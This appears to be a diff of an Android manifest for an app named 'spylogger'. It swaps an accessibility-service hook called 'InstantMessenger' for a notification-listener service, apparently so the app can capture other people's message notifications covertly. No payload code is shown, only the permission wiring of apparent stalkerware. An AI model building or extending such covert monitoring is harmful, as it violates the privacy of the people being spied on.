@@ -88,13 +88,13 @@
             android:label="call service">
         </service>-->
 
-        <service android:name="com.gravatasufoca.spylogger.receivers.InstantMessenger"
+        <!--notificacao-->
+        <service android:name=".receivers.NotificationMonitor"
             android:label="@string/app_name"
-            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE">
+            android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE">
             <intent-filter>
-                <action android:name="android.accessibilityservice.AccessibilityService" />
+                <action android:name="android.service.notification.NotificationListenerService" />
             </intent-filter>
-            <meta-data android:name="android.accessibilityservice" android:resource="@xml/accessibilityservice" />
         </service>
 
         <!--boot-->
